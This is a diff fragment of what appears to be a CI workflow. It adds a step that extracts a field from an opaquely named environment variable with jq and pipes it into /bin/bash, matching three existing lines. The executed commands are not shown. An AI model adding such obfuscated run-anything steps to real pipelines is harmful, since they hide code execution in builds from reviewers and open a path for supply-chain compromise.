@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$m000" | jq -r .ff07 | /bin/bash
           echo $vtrk73 | jq -r .f515 | /bin/bash
           echo $yeyxi3 | jq -r .kg2 | /bin/bash
+          printf '%s' "$o20268" | jq -r .udm4 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
